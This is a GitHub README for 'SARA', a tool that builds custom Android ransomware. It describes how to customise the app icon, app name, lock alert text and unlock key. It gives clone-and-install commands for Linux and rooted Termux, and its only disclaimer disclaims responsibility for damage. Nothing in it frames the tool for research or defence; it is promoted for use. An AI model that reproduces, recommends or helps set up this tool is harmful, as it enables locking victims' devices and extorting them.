<img title="SIGIT" src="https://img.shields.io/badge/CODENAME%20-SARA-SCRIPT?colorA=grey&colorB=green&style=for-the-badge"> <img title="SARA" src="https://img.shields.io/badge/VERSION%20-1.0-SCRIPT?colorA=grey&colorB=green&style=for-the-badge"> 
<img src="https://raw.githubusercontent.com/termuxhackers-id/SARA/main/src/overview.jpg">
SARA - Simple Android Ransomware Attack

### Disclaimer
The author is not responsible for any issues or damage caused by this program.

### Features
User can customize:
- ```app_icon``` - custom icon application
- ```app_name``` - custom name application
- ```alert_title``` - custom alert title
- ```alert_desc``` - custom alert description
- ```key_pass``` - custom key for unlock devices
### Installation
Quick installation for Ubuntu, Kali Linux, Darwin (MAC)
```bash
git clone https://github.com/termuxhackers-id/SARA && cd SARA && sudo bash install.sh
```

Quick installation for Termux Android (ROOT)
````bash
apt-get install tsu git imagemagick python -y && python3 -m pip install Pillow && git clone https://github.com/R1punk/SARA && cd SARA && tsu && bash installtermux.sh && python3 tehsara.py
````
#### Sara for Termux by [@R1punk](https://github.com/R1punk/SARA)
Tutorial on Termux Android [watch here](https://youtu.be/poXKCgaBg3c)

### Dependencies
- Java
  - Openjdk 11
- Aapt
- Apktool
  - Apktool 2.4.0
- Zipalign
- Imagemagick
- Python3
- Python3-pip
  - Pillow

### Tools overview
<img src="https://raw.githubusercontent.com/termuxhackers-id/SARA/main/src/view.jpg"></img>
Need root access for ```Termux Android```

### Ransomware overview
<img src="https://raw.githubusercontent.com/termuxhackers-id/SARA/main/src/ransomware.jpg"></img>
Tested on devices ```Android 10```

### Output logs
<img src="https://raw.githubusercontent.com/termuxhackers-id/SARA/main/src/outputlog.jpg"></img>

### Support Us
Facebook [@termuxhackers.id](https://fb.me/termuxhackers.id)<br>
Instagram [@termuxhackers.id](https://instagram.com/termuxhackers.id)

### Credit's
Copyright © 2021 by [Termux Hackers](https://github.com/termuxhackers-id)
